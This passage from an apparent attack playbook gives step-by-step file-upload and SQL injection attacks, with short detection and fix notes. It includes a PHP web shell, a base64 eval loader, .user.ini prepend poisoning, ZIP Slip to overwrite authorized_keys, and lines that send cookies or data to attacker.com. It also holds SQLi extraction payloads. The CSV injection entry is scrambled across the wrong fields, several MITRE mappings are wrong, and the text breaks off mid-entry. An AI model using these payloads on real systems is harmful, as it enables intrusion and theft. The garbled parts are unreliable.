- **Vulnerability**: Implicit deserialization via file metadata
- **MITRE**: T1203 – Exploitation for Execution
- **Impact**: Remote code execution, full server access
- **Tools**: Burp Suite, PHPGGC, custom .phar tools
- **Scenario**: Attackers upload .phar (PHP Archive) files that include serialized objects in metadata. If the server uses file_exists() or similar on that file, PHP may deserialize it.
- **Attack Steps**: Step 1: Create a malicious .phar file using PHPGGC, which generates a serialized PHP object inside the archive's metadata (like filename or manifest). Step 2: Choose a gadget chain like monolog, laravel, or another PHP library vulnerable to deserialization. Step 3: Upload this .phar file to the server (e.g., via image uploader or document uploader). Step 4: The file is stored on disk, and its path becomes known (e.g., /uploads/exploit.phar). Step 5: If the PHP backend uses functions like file_exists("phar:///uploads/exploit.phar"), exif_read_data(), or is_file() on that path, PHP will deserialize the archive metadata. Step 6: The embedded payload runs immediately during this metadata access — not even requiring the file to be executed directly. Step 7: This leads to RCE even in seemingly harmless upload locations. Step 8: To verify, add a command execution payload like system("curl attacker.com?hit=phar") and watch your listener. Step 9: This attack is stealthy and bypasses many web shell filters.
- **Detection**: Monitor for .phar reads; alert on unexpected gadget deserialization
- **Solution**: Disable phar stream wrappers unless needed; don’t pass user-controlled paths to file-check functions
- **Tags**: PHAR Deserialization, File Metadata Exploit

## Upload .user.ini or .env File to Inject Config

- **Attack Type**: Config Injection via Upload
- **Target**: PHP web apps using .ini or .env
- **Vulnerability**: Config files uploaded and auto-loaded
- **MITRE**: T1552.004 – Unsecured Credentials
- **Impact**: Code execution or sensitive data exposure
- **Tools**: Burp Suite, Notepad, curl
- **Scenario**: If the server allows uploading .user.ini or .env, attackers can override app config (e.g., enable PHP functions, leak secrets).
- **Attack Steps**: Step 1: Open Notepad and create a .user.ini file with this content: auto_prepend_file = /var/www/html/uploads/shell.php. Step 2: Upload this .user.ini to a writable folder (like /uploads/) via the web form. Step 3: Ensure that a PHP shell file like shell.php is also present in the same directory. Step 4: If the server uses PHP and is configured to respect .user.ini, your shell file will now be prepended (executed first) before any PHP code runs. Step 5: Visit the shell via URL like http://target.com/uploads/shell.php — the server runs the code defined in the .user.ini. Step 6: Alternatively, upload a .env file with fake variables like APP_KEY=malicious_key or DB_PASSWORD=admin. Step 7: If the server loads .env files on runtime (common in Laravel), this can influence app behavior or leak secrets via error messages. Step 8: Works best on shared hosting or misconfigured Laravel, Symfony, CodeIgniter setups. Step 9: Use this to activate unsafe features, leak variables, or elevate privileges.
- **Detection**: Monitor uploads for dangerous file extensions like .ini, .env
- **Solution**: Block sensitive file uploads; disable .user.ini parsing in uploads folder; deny access to .env
- **Tags**: Config Upload, PHP Abuse, Env File Injection

## Race Condition During File Validation and Move

- **Attack Type**: TOCTOU Race in File Upload
- **Target**: File systems with delayed move/save
- **Vulnerability**: File not locked between validation and final write
- **MITRE**: T1205 – TOCTOU
- **Impact**: Upload bypass → code execution or dangerous file write
- **Tools**: Burp Suite, Turbo Intruder, custom Python script
- **Scenario**: Exploits gap between upload validation and final save — attacker swaps file with malicious version between checks.
- **Attack Steps**: Step 1: Upload a harmless file (like safe.png) using the web app’s file upload form. Step 2: Intercept the request using Burp Suite and note the exact filename or temp name used (tmp1234). Step 3: Understand that the app may first save the file in a temporary location, perform MIME/type validation, and then move it to final destination (e.g., /uploads/). Step 4: During this brief window (milliseconds to a few seconds), trigger a race condition. Step 5: Use a fast script or Turbo Intruder to replace the original file with a malicious one — such as a shell.php. This is often done by writing to the temporary file’s path again using multiple threads. Step 6: If timed right, the app thinks it's still saving safe.png, but actually saves shell.php or safe.php. Step 7: Visit the final file URL and confirm execution. Step 8: You can monitor access logs or use Interactsh to confirm payload triggers. Step 9: This is a Time-of-Check to Time-of-Use (TOCTOU) issue in upload pipelines.
- **Detection**: Monitor temp directories and validate post-write content
- **Solution**: Lock files immediately on write; revalidate before final move; disallow overwrite of temp files
- **Tags**: Race Condition, Upload, TOCTOU

## Race Condition via Filename Change in Parallel Thread

- **Attack Type**: File Rename + Upload Race for Bypass
- **Target**: Uploads processed by background jobs
- **Vulnerability**: No lock or name enforcement during processing
- **MITRE**: T1205 – Race Condition
- **Impact**: File executed or saved with wrong (malicious) type
- **Tools**: Python watchdog, Burp, Turbo Intruder
- **Scenario**: Attackers upload a safe file but rename it after validation, before execution or processing occurs, bypassing extension or type checks.
- **Attack Steps**: Step 1: Start by uploading a normal .jpg or .txt file that the server allows — e.g., avatar.jpg. Step 2: Intercept the file upload path or ID used in backend (e.g., /tmp/avatar_123.jpg). Step 3: Wait for the server to perform validation — content type, extension, size, etc. Step 4: Before the server finishes processing or calling the file again, rename the file on disk using a parallel thread or custom script (e.g., rename to avatar.php). Step 5: When the server accesses the file again (e.g., to move it or preview it), it ends up using the new name. Step 6: If no revalidation is done, it may allow or execute the .php file. Step 7: Works well on systems that reference file by ID, not name, and later rename files without checking again. Step 8: This lets attackers run web shells or upload forbidden types. Step 9: Combine with high-speed local upload (or compromised low-priv server) to time this precisely.
- **Detection**: Monitor file name and metadata changes in real time
- **Solution**: Lock file name during processing; re-verify path and type before final move
- **Tags**: File Rename Race, Validation Bypass

## ZIP Archive with Symbolic Links (Symlink Attack)

- **Attack Type**: Path Traversal via ZIP Archive
- **Target**: File extractors / upload processors
- **Vulnerability**: Directory traversal via symlink in archive
- **MITRE**: T1006 – File System Permissions Weakness
- **Impact**: Overwrite system files, execute arbitrary files
- **Tools**: zip, evilzip.py, Burp Suite, CLI
- **Scenario**: ZIP file contains symbolic links that point to sensitive system paths. When server extracts the archive, it places or overwrites files outside the intended directory.
- **Attack Steps**: Step 1: Use a tool like evilzip.py or the zip CLI to craft a malicious ZIP file. Inside the ZIP, add a file like ../../../../etc/passwd using a symbolic link or traversal path. Step 2: Name the ZIP something like resume.zip to appear benign. Step 3: Upload the ZIP via the web app's document upload feature. Step 4: If the server automatically extracts ZIP files to a folder (e.g., /var/www/uploads/), the symlink path causes the extracted file to land outside that folder, potentially in /etc/. Step 5: Depending on write permissions, this may overwrite or drop files in critical locations like /etc/cron.d, /var/www/html/shell.php, or /root/.ssh/authorized_keys. Step 6: You can use this to plant backdoors, execute code, or overwrite logs. Step 7: Visit the dropped file or check functionality to confirm exploit. Step 8: This is also called a ZIP Slip attack and bypasses basic filename checks if directory traversal is not sanitized during extraction.
- **Detection**: Monitor extraction paths; scan ZIP contents for traversal or symlink indicators
- **Solution**: Sanitize ZIP contents; use secure unzip libraries; block traversal patterns in ZIP files
- **Tags**: ZIP Slip, Symlink Attack, Archive Exploit

## SVG to Access Internal Network via Embedded Resources

- **Attack Type**: SSRF via Embedded SVG Tags
- **Target**: Browsers or backend rendering SVGs
- **Vulnerability**: SSRF via embedded tag in image files
- **MITRE**: T1040 – Network Sniffing
- **Impact**: Access internal systems, ports, metadata
- **Tools**: Custom SVG, Burp Suite, internal IP ranges
- **Scenario**: Attackers upload SVGs with <image>, <script>, or <use> tags that reference internal IPs or services. Browser or parser may fetch these.
- **Attack Steps**: Step 1: Open a text editor and create a custom SVG file. Add a tag like <image xlink:href="http://127.0.0.1:8080/admin"/> inside the <svg> block. Step 2: Save it as image.svg and upload it via the app’s image or document upload form. Step 3: If the uploaded SVG is later rendered by the server or viewed by an internal user/admin via browser, the <image> tag attempts to fetch content from the internal IP (127.0.0.1, 169.254.169.254, etc.). Step 4: You can chain this with DNS logging or time delay tricks to confirm access (e.g., via http://attacker.com/delay?url=http://localhost). Step 5: Use <script>, <use>, or even <style background-image> to load from internal APIs. Step 6: This is a blind SSRF where the image tag becomes a way to proxy requests from the server or client-side viewer. Step 7: Monitor your request logs for evidence of these fetches.
- **Detection**: Monitor image load requests to internal IPs or unknown domains
- **Solution**: Sanitize all SVG uploads; disallow remote xlink:href; use image sanitizers like SVGO
- **Tags**: SVG SSRF, Image Injection, SSRF via Upload

## File Inclusion via Improper Usage of require($_GET['page'])

- **Attack Type**: LFI / RFI via Parameter Injection
- **Target**: PHP servers using include/require
- **Vulnerability**: Dynamic inclusion without validation
- **MITRE**: T1136 – Create or Modify System Process
- **Impact**: RCE, file disclosure, backend takeover
- **Tools**: Burp Suite, browser, curl
- **Scenario**: PHP applications using unsanitized require() or include() allow attackers to include arbitrary files, including remote or uploaded ones.
- **Attack Steps**: Step 1: Visit a target URL that includes a dynamic page parameter like http://target.com/index.php?page=home. Step 2: Change the value of page to a system file path: http://target.com/index.php?page=../../../../etc/passwd. Step 3: If no input validation exists, the require() or include() function includes the raw file content into the PHP execution. Step 4: To escalate, upload a PHP shell file via another upload form on the site (e.g., shell.php). Step 5: Then call the shell using: http://target.com/index.php?page=uploads/shell. Step 6: If the server executes it, you now have code execution. Step 7: You can also include remote files like http://attacker.com/shell.txt if allow_url_include=On. Step 8: This is a Local File Inclusion (LFI) or Remote File Inclusion (RFI) attack and is often combined with other vectors like log poisoning. Step 9: Always test with null byte (%00) or file wrappers if basic checks exist.
- **Detection**: Log all usage of include() or require() with dynamic input
- **Solution**: Never allow user input in file inclusion; use strict whitelists or routing frameworks
- **Tags**: LFI, RFI, PHP Include Abuse, File Disclosure

## Misconfigured Upload Folder with Executable Permissions

- **Attack Type**: Web Shell Execution via Upload Folder Misconfig
- **Target**: Web servers with public upload dir
- **Vulnerability**: Writable + executable upload directory
- **MITRE**: T1203 – Exploitation for Execution
- **Impact**: Web shell access, full remote control
- **Tools**: Burp Suite, browser, Interactsh
- **Scenario**: Applications store uploaded files in a public, executable directory like /uploads/, allowing direct execution of PHP or ASPX files.
- **Attack Steps**: Step 1: Upload a PHP web shell (e.g., shell.php) through the site’s upload form. Step 2: Observe the response or intercept it in Burp to find the upload location (e.g., /uploads/shell.php). Step 3: Visit this URL directly in the browser: http://target.com/uploads/shell.php. Step 4: If the upload folder has execution permission, your code executes immediately. Add a payload like <?php system($_GET['cmd']); ?> in the file. Step 5: Test with ?cmd=id to confirm RCE. Step 6: If the server returns the output (e.g., uid=33(www-data)), it confirms that the folder allows executing uploads. Step 7: Try other formats too: .jsp, .aspx, or .cgi based on tech stack. Step 8: This is a result of improperly configured upload directories, especially in shared hosting or legacy setups. Step 9: Use extensions like .php;.jpg to bypass weak filters if needed.
- **Detection**: Monitor file uploads + access; alert on script execution in upload path
- **Solution**: Disallow execution in /uploads/; serve uploaded files from separate non-executable volume
- **Tags**: File Upload Execution, Web Shell, Misconfigured Upload

## File Upload via Base64 Encoded Inline Payload

- **Attack Type**: Encoded Payload Upload (bypassing content filters)
- **Target**: File processors, PHP servers
- **Vulnerability**: Base64-encoded script bypasses upload filters
- **MITRE**: T1027 – Obfuscated Files or Information
- **Impact**: Remote code execution, bypass of WAF filters
- **Tools**: Base64 encoder, Burp Suite, PHP
- **Scenario**: Uploading a malicious script encoded as Base64 to bypass file upload validation or MIME checks. If decoded and executed server-side, leads to RCE or info disclosure.
- **Attack Steps**: Step 1: Write a malicious PHP payload like <?php system($_GET['cmd']); ?>. Step 2: Use a tool like base64 (Linux) or an online encoder to convert the payload into Base64, e.g., PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+. Step 3: Save the payload in a file with a .txt or .php.txt extension. Inside the file, you can also wrap it in a PHP decoder: <?php eval(base64_decode("PD9w...")); ?>. Step 4: Upload this file through the web app's file upload feature. Many servers don't scan for base64 payloads if extension or content-type is safe. Step 5: Access the file through its URL, like http://target.com/uploads/shell.php.txt. Step 6: If the server has misconfigured MIME handling or interprets .php.txt as PHP, your payload will run. Step 7: Test execution with ?cmd=id. This bypass technique is useful when raw code is blocked but encoded content is not.
- **Detection**: Detect encoded patterns in uploaded files; decode suspicious payloads automatically
- **Solution**: Sanitize uploaded content; block dangerous MIME types and use strict file handlers
- **Tags**: Base64 Bypass, Encoded Upload, MIME Evasion

## Backdoor Placement via Unfiltered File Import

- **Attack Type**: Exploiting Import Features to Plant Backdoors
- **Target**: CMS, CRM, ERP file importers
- **Vulnerability**: Trusting file contents without sanitization
- **MITRE**: T1203 – Exploitation for Execution
- **Impact**: Persistent backdoor, config takeover
- **Tools**: Burp Suite, crafted config file
- **Scenario**: Applications that allow importing configuration or template files (e.g., .ini, .xml, .conf) can be exploited to include backdoor payloads.
- **Attack Steps**: Step 1: Create a file meant for importing, such as settings.ini, but embed PHP or scripting logic inside. For example, write: [config]\npath=<?php system($_GET['cmd']); ?>. Step 2: Go to the import feature in the target app (often used in CMS, CRM, ERP tools) and upload your malicious .ini or .xml file. Step 3: If the application stores this file in a web-accessible folder without sanitizing its content, you may be able to access it via a URL. Step 4: Try loading the file using http://target.com/uploads/settings.ini?cmd=id. Step 5: Some frameworks or plugins directly parse or execute file contents (e.g., insecure include() usage). Step 6: If execution happens, you get a working web shell. This trick works best when import features are not secured and uploaded files are never validated.
- **Detection**: Audit imported config files for code or shell characters
- **Solution**: Strip executable characters during import; restrict access to import folders
- **Tags**: File Import Abuse, Upload Backdoor, Config Exploit

## Cross-Site Script Inclusion (XSSI) from Uploaded JS

- **Attack Type**: Stored XSSI (JS file hosted on same domain)
- **Target**: Web pages including dynamic scripts
- **Vulnerability**: Unvalidated script inclusion from user uploads
- **MITRE**: T1056 – Input Capture
- **Impact**: Session hijacking, cookie theft
- **Tools**: Burp Suite, JS payload generator
- **Scenario**: Uploading a .js file with malicious script that is later included via <script src=...>, leaking cookies, tokens, or session data to attacker.
- **Attack Steps**: Step 1: Create a JavaScript file named steal.js and add a payload like: document.write('<img src="http://attacker.com/?cookie=' + document.cookie + '">');. Step 2: Upload the file through a feature like resume/CV uploader, avatar upload (if JS allowed), or template editor. Step 3: After upload, test if the file is accessible via URL like http://target.com/uploads/steal.js. Step 4: In a separate place (e.g., admin panel, editor, forum), attempt to inject <script src="/uploads/steal.js"></script>. Step 5: If an admin or user loads a page with this tag, the script executes in their browser and sends their cookie/session/token to the attacker's site. Step 6: Log the incoming requests on your attacker-controlled site to confirm exfiltration. Step 7: This attack works well if the upload server serves files on the same origin as the app.
- **Detection**: CSP headers analysis; monitor for unknown external JS includes
- **Solution**: Do not serve uploaded JS files on same domain; use content security policy (CSP)
- **Tags**: XSSI, Script Upload, Cookie Theft, JavaScript Injection

## CSV Injection (Formula Injection) in Uploaded CSV

- **Attack Type**: Formula Injection via Excel/Sheets
- **Target**: Step 1: Open a text editor and create a file named report.csv. Add a row like: `=HYPERLINK("http://attacker.com/"+cmd
- **Vulnerability**: /C whoami','ClickMe'). **Step 2:** Add other rows to make it appear like a normal report. Save the file. **Step 3:** Upload this .csvvia the document upload feature of the web application. **Step 4:** Wait for an admin, HR, or analyst to open the file in Excel or LibreOffice. **Step 5:** If macros/formula execution is enabled, the malicious formula executes, opening applications (like calc) or triggering requests to your server. **Step 6:** For exfiltration, use=WEBSERVICE("http://attacker.com/"&A1)` or similar. Step 7: Monitor your attacker server for hits. This is known as CSV Injection or Formula Injection and targets applications that process uploads for offline use. Step 8: You can also chain this with stored XSS if the content is imported into HTML later.
- **MITRE**: HR/admin tools opening uploaded files
- **Impact**: Executable formulas in spreadsheet software
- **Tools**: /C calc'!A0`) that execute when opened in Excel or other spreadsheet software.
- **Scenario**: Uploading a .csv file with formula-like values (e.g., `=cmd
- **Attack Steps**: LibreOffice, Excel, Notepad++, Burp Suite
- **Detection**: T1059 – Command Execution via Macros
- **Solution**: Remote code execution, credential theft
- **Tags**: Audit uploaded .csv content for =, +, @, - as first characters

## PDF with JS Trigger for RCE in pdf.js

- **Attack Type**: RCE via JavaScript in PDF (Client-Side pdf.js Execution)
- **Target**: Web apps with in-browser PDF preview
- **Vulnerability**: JS execution in unsanitized embedded PDF content
- **MITRE**: T1203 – Exploitation for Client Execution
- **Impact**: JS-based file read, credential theft, or client-side code execution
- **Tools**: EvilPDF, Burp Suite, pdf.js, Metasploit
- **Scenario**: Uploading a malicious PDF that embeds JavaScript to execute when rendered by pdf.js or vulnerable PDF viewers, possibly leading to RCE or exfiltration.
- **Attack Steps**: Step 1: Create a PDF using EvilPDF or msfvenom with JavaScript embedded: app.alert("Document loaded"); or this.exportDataObject({ cName: "data.txt", nLaunch: 2 });. Step 2: Save the payload as malicious.pdf. Step 3: Upload this file via a web application accepting PDF uploads. Step 4: If the app uses a JavaScript-based PDF renderer (e.g., Mozilla's pdf.js), the JS may execute when an admin or victim opens the file inside the browser. Step 5: Observe for popups, file access, or network calls if successful. Step 6: Replace alert with data exfiltration or local file access commands. Step 7: If execution occurs, use advanced JS payloads to exploit browser APIs or steal sensitive content. Step 8: Attack works best in apps that preview uploaded PDFs automatically without sanitization. Step 9: Monitor logs on your attacker's server for GET/POST requests triggered by the JS inside the PDF.
- **Detection**: Monitor for unusual PDF content or JS calls from pdf.js viewers
- **Solution**: Use PDF sanitizers like qpdf; disable JS in pdf.js; never render untrusted PDFs inline
- **Tags**: PDF Exploit, Embedded JavaScript, pdf.js Injection

## .ini File Upload to Poison PHP Settings

- **Attack Type**: Configuration Poisoning via Uploaded .ini File
- **Target**: PHP servers with .user.ini support
- **Vulnerability**: Directory-level config override via upload
- **MITRE**: T1203 – Exploitation for Execution
- **Impact**: PHP config tampering → code execution
- **Tools**: Burp Suite, Text Editor
- **Scenario**: Uploading .user.ini files with overridden PHP directives to enable code execution in directories that read .ini automatically (e.g., .user.ini in PHP-FPM/Apache).
- **Attack Steps**: Step 1: Create a file called .user.ini or evil.ini with the following content: auto_prepend_file=shell.php. Step 2: Upload this file via the application’s document/image upload form. Step 3: In the same upload request (or a separate one), upload shell.php with payload: <?php system($_GET['cmd']); ?>. Step 4: If the web server (like Apache with PHP-FPM) allows .user.ini files in that folder, your setting forces PHP to include shell.php for every page in that folder. Step 5: Visit any other PHP file in that folder (e.g., index.php?cmd=id) to confirm that the shell is loaded automatically via auto_prepend_file. Step 6: Now you can execute any command without directly calling the shell. Step 7: This bypasses standard route-based access and WAFs by poisoning config at the directory level. Step 8: Attack succeeds only if .ini parsing is not disabled in the folder.
- **Detection**: Scan uploads for .ini/.htaccess; analyze webroot directory settings
- **Solution**: Disallow upload of .ini/.htaccess; move uploads to separate static file storage
- **Tags**: PHP Poisoning, .ini Config Abuse, Upload Exploit

## Arbitrary File Read via Uploading Config with Known Path

- **Attack Type**: File Read via Controlled File Placement
- **Target**: Applications exposing file readers
- **Vulnerability**: File read from disk by referencing attacker-uploaded files
- **MITRE**: T1005 – Data from Local System
- **Impact**: Secret exfiltration, recon, or chaining into RCE
- **Tools**: Burp Suite, browser
- **Scenario**: If attacker can upload a file to a known path, they can trigger file read features (like log viewers, templates, config parsers) to read it and return its content.
- **Attack Steps**: Step 1: Identify an upload function that stores files at a predictable location (e.g., /uploads/user123/file.txt). Step 2: Upload a specially named file such as my-config.ini, readme.txt, or even ../../etc/passwd if path traversal is possible. Step 3: Find or guess a feature in the app that reads/display files from disk—like template loaders, log readers, or file managers. Step 4: Use the known file path in a parameter: http://target.com/view?file=/uploads/user123/file.txt. Step 5: If the app reads and displays the file, you now control both the file path and the content, enabling read-after-write attacks. Step 6: You can plant .php, .json, .yml, or .env files and then try to get the server to read and parse them. Step 7: Use this to leak secrets, tokens, or configuration from server memory or storage. Step 8: Also useful in SSRF/XXE chained attacks if file:// access is allowed.
- **Detection**: Track uploaded file access; check logs for abnormal file read requests
- **Solution**: Prevent predictable upload paths; disable file includes based on user parameters
- **Tags**: Arbitrary File Read, Local File Exploitation, Upload Abuse

## File Overwrite via Predictable File Name in Upload

- **Attack Type**: File Overwrite via Static Filename Collision
- **Target**: Any app with uploadable, predictable paths
- **Vulnerability**: Lack of file uniqueness or name randomization
- **MITRE**: T1496 – Resource Hijacking
- **Impact**: Defacement, DoS, privilege escalation via config overwrite
- **Tools**: Burp Suite, browser, curl
- **Scenario**: Attackers upload a file with a known or predictable filename to overwrite a critical file used by the application (e.g., config, image, or web assets).
- **Attack Steps**: Step 1: Visit a target web application that allows file uploads (e.g., image or document uploads). Step 2: Observe if the uploaded file path or name is predictable. For example, it always saves as avatar.jpg or uses your username like uploads/user1.jpg. Step 3: Attempt to upload a file with the same name as a file that already exists, e.g., robots.txt, config.php, or default.jpg. Step 4: If allowed, your file overwrites the original one. Step 5: This can break the app (DoS), modify visible content (e.g., logo replaced), or escalate to RCE if you overwrite a .php or template file. Step 6: Test with .htaccess or .user.ini as well. Step 7: Confirm overwrite by reaccessing the original URL and verifying the content change. Step 8: This attack can also replace JSON config files or update .env credentials in misconfigured setups.
- **Detection**: Monitor for file access changes; hash compare replaced files
- **Solution**: Add UUID or timestamp to file names; never allow overwrite of existing files; restrict upload folders
- **Tags**: File Overwrite, Static Filename, Upload Abuse

## Extension Bypass via Double-Content Files (MIME Sniffing Abuse)

- **Attack Type**: MIME Confusion to Trick File Type Validation
- **Target**: Servers validating file type weakly
- **Vulnerability**: Trusting Content-Type over actual content
- **MITRE**: T1203 – Exploitation for Execution
- **Impact**: Server-side RCE or client-side JS execution
- **Tools**: Hex Editor, Burp Suite, curl
- **Scenario**: Uploading files that contain two valid formats (e.g., image + script) to trick content validation and execute on the client or server.
- **Attack Steps**: Step 1: Create a double-content file such as a GIF with embedded JavaScript or PHP code: Start the file with GIF header (GIF89a) and append <?php system($_GET['cmd']); ?>. Step 2: Save the file as shell.php or shell.gif. Step 3: Upload the file to a target app that validates MIME type or extension only via headers. Step 4: If MIME-based validation is weak (e.g., trusts Content-Type: image/gif), it will allow the upload. Step 5: Try accessing the file via its upload URL. If the server uses file extension or browser MIME sniffing, the PHP part may be executed. Step 6: If not, try triggering rendering in a dynamic template or forcing it to be handled by PHP interpreters. Step 7: This works best in Apache/nginx misconfigs or where MIME sniffing is enabled in client browsers. Step 8: Test with multiple combinations: .php.gif, .jpg;.php, or with Content-Type: application/octet-stream.
- **Detection**: Scan uploads for polyglot patterns; check headers vs content
- **Solution**: Always inspect file magic bytes; use secure MIME type validation server-side
- **Tags**: MIME Sniffing, Polyglot File, Bypass Upload Filters

## Upload to Public CDN + Trigger Client-Side Fetch

- **Attack Type**: Abusing CDN or Cache to Deliver Malicious File
- **Target**: Sites using public CDNs for assets
- **Vulnerability**: Public caching of untrusted, user-uploaded files
- **MITRE**: T1566 – Phishing
- **Impact**: XSS, phishing, malicious script injection
- **Tools**: Burp Suite, browser dev tools, public CDN endpoints
- **Scenario**: Uploading a malicious file (JS/HTML) to a CDN-backed path where it becomes publicly cached and served to other users, leading to XSS or phishing.
- **Attack Steps**: Step 1: Register or use an app that uses a CDN for uploaded assets (e.g., Cloudflare, Akamai, Fastly). Step 2: Upload a file such as phish.html or xss.js via an upload form. Step 3: If the CDN caches it publicly (e.g., without authentication, with URL like cdn.example.com/uploads/user1/xss.js), copy the direct link. Step 4: Share the link via phishing or trick users/admins into visiting it. Step 5: If the file is a malicious HTML page or script, and auto-loaded by the frontend, it may steal cookies, session tokens, or perform XSS. Step 6: You may also embed the file as a <script src="https://cdn.example.com/uploads/xss.js"> in another page to run it in the victim's context. Step 7: Use caching tools like CDN cache validators to confirm global availability. Step 8: This attack succeeds if the app does not check file types or restrict access to uploaded content.
- **Detection**: Monitor file access from CDN paths; audit CDN config
- **Solution**: Restrict CDN to allowlisted types; never cache JS/HTML from uploads; use signed URLs
- **Tags**: CDN Abuse, XSS via Asset Delivery, Public Cache Injection

## WAF Evasion via Chunked Transfer Encoding Upload

- **Attack Type**: Firewall Bypass via HTTP Chunked Transfer
- **Target**: Servers behind parsing WAFs
- **Vulnerability**: Inconsistent HTTP parsing between WAF and backend
- **MITRE**: T1203 – Exploitation for Execution
- **Impact**: Upload filter/WAF bypass, RCE
- **Tools**: curl, Burp Suite, Postman
- **Scenario**: Bypassing WAF or upload filters by breaking file content into HTTP chunks, confusing parsing layers and sneaking malicious payloads.
- **Attack Steps**: Step 1: Open Burp Suite or curl with chunked transfer mode. Step 2: Craft an HTTP POST upload request using Transfer-Encoding: chunked header. Step 3: Split the malicious payload (e.g., <?php system($_GET['cmd']); ?>) into small chunks, each with its length in hex followed by CRLF. Example: 4\r\n<?ph\r\n5\r\np sy\r\n7\r\nstem($_G\r\n.... Step 4: Send this custom-chunked POST request to the file upload endpoint. Step 5: Many WAFs will parse the payload incorrectly or miss the reassembled malicious script. Step 6: Server, however, recombines the chunks correctly and stores a full PHP file. Step 7: Access the uploaded file and verify execution. Step 8: This is a known method to bypass ModSecurity and other WAFs that parse before the HTTP layer is fully assembled.
- **Detection**: Log chunked requests; compare raw upload body vs parsed result
- **Solution**: Normalize and inspect full request body server-side; block chunked uploads unless needed
- **Tags**: Chunked Encoding, WAF Bypass, Transfer Encoding Attack

## Bypass Signature Verification via Case or Filename Tricks

- **Attack Type**: Exploiting Weak Signature Verification for File Upload
- **Target**: Upload services using filename-based checks
- **Vulnerability**: Loose matching or weak canonicalization in validation
- **MITRE**: T1027 – Obfuscated Files or Information
- **Impact**: Signature bypass, upload filter bypass
- **Tools**: Burp Suite, curl, Text Editor
- **Scenario**: Exploiting filename tricks (like case change or trailing characters) to bypass digital signature validation or allowlist checks on file uploads.
- **Attack Steps**: Step 1: Target a site that uses signed uploads (e.g., only signed filenames like file-12345.png allowed). Step 2: Try renaming your malicious file to File-12345.png (case variation), file-12345.png%00.php, or file-12345.png....php. Step 3: Some systems verify signatures only on exact matches or stripped filenames—so this tricks them into accepting invalid files. Step 4: Upload with the modified filename and observe server behavior. Step 5: If allowed, the server may store it with .php or render it in a template or preview context. Step 6: You can also append null bytes (%00) or use Unicode whitespace to bypass filename checks. Step 7: For signed URLs, try signed_url?filename=file.jpg and upload file.jpg.php. Step 8: These tricks succeed due to poor normalization or unsafe filename parsing in backend logic.
- **Detection**: Audit upload file logs; normalize and compare raw filenames
- **Solution**: Always canonicalize filenames; strip and validate extensions properly before allowing uploads
- **Tags**: Signature Bypass, Filename Tricks, Unicode/Case Evasion

## Error-Based SQL Injection via Malformed Query

- **Attack Type**: SQL Injection - Error Based
- **Target**: Websites with input fields
- **Vulnerability**: Unsanitized user inputs
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data leakage, credential theft
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: Attacker injects malformed SQL syntax that causes database errors revealing sensitive information like table names, columns, or data.
- **Attack Steps**: Step 1: Find a user input field vulnerable to SQL injection, e.g., login username or search box. Step 2: Enter an input containing a single quote ' to check for SQL syntax errors. If the app shows errors like "syntax error", it's vulnerable. Step 3: Try inputs like ' OR 1=1-- or ' AND 1=0-- to test behavior changes (bypass or block). Step 4: Use crafted payloads that cause database errors revealing structure, e.g., UNION SELECT NULL, version(), NULL-- in numeric or string fields. Step 5: Observe error messages disclosing database type, version, or table names in the page or response. Step 6: Use error info to plan further injection (dump tables, extract data). Step 7: Confirm by retrieving data using UNION or concatenation. Step 8: Repeat tests for other input points (URLs, POST fields). Step 9: This type is noisy and visible but easy for beginners to test manually. Step 10: Use sqlmap to automate extraction once vulnerability confirmed.
- **Detection**: Monitor logs for SQL errors; WAF alerts on error patterns
- **Solution**: Use prepared statements, input validation, least privilege DB user permissions
- **Tags**: SQLi, Error-Based, Manual Testing

## Blind Boolean-Based SQL Injection

- **Attack Type**: SQL Injection - Blind Boolean Based
- **Target**: Websites with restricted error display
- **Vulnerability**: Unsanitized inputs, no error feedback
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data leakage, stealthy attack
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: No error messages shown; attacker injects SQL that returns true/false, inferring data by observing page changes.
- **Attack Steps**: Step 1: Identify input fields that don’t display errors but interact with backend (e.g., search or login). Step 2: Inject a boolean condition like ' AND 1=1-- and note the page response or behavior. Step 3: Inject ' AND 1=0-- and observe difference (e.g., error, blank page, different content). Step 4: Use binary search technique to extract data character-by-character. For example, check if ASCII code of first letter in username is > 77: ' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 77--. If page response is positive, guess higher or lower values to find exact character. Step 5: Repeat for each character to extract usernames, passwords, or other data. Step 6: This method is slow but effective when errors are suppressed. Step 7: Automate with sqlmap by specifying --technique=B for blind boolean SQLi. Step 8: Verify injection on multiple parameters and HTTP methods (GET/POST). Step 9: Avoid detection by timing your requests and limiting traffic. Step 10: Store extracted data carefully for analysis.
- **Detection**: Monitor abnormal request patterns; anomaly detection in response times
- **Solution**: Use prepared statements, strict input validation, output encoding
- **Tags**: SQLi, Blind Boolean, Manual Testing

## Time-Based Blind SQL Injection Using SLEEP()

- **Attack Type**: SQL Injection - Blind Time Based
- **Target**: Websites with no error output
- **Vulnerability**: Unsanitized input, blind to errors
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data theft, stealthy breach
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: Inject SQL with time delays (e.g., SLEEP) to infer true/false by measuring response delays when errors are suppressed.
- **Attack Steps**: Step 1: Identify input points that don’t show errors but interact with database. Step 2: Inject payloads like ' OR IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0)-- and observe response time. If server delays response, condition is true. Step 3: Change the character index and value to extract database names, user names, or data character by character. Step 4: Automate slow character-by-character extraction by binary searching ASCII values to minimize requests. Step 5: Repeat for different tables and columns by changing SQL subqueries. Step 6: Use tools like sqlmap with --technique=T for time-based attacks. Step 7: Record response times carefully to avoid false positives due to network lag. Step 8: Use this when error-based and boolean-based injections are not possible. Step 9: Be patient; this technique is slow but effective against hardened systems. Step 10: Once confirmed, dump full database info similarly.
- **Detection**: Monitor slow responses and unusual request patterns
- **Solution**: Use parameterized queries; detect and block time-based payload patterns
- **Tags**: SQLi, Time-Based Blind, Manual Testing

## Out-of-Band SQL Injection via DNS Exfiltration

- **Attack Type**: SQL Injection - Out-of-Band
- **Target**: Targets behind strict filters
- **Vulnerability**: DB server can make external DNS queries
- **MITRE**: T1041 – Exfiltration Over C2 Channel
- **Impact**: Data exfiltration, stealthy attack
- **Tools**: Burp Suite, DNS server (e.g., Interact.sh), sqlmap
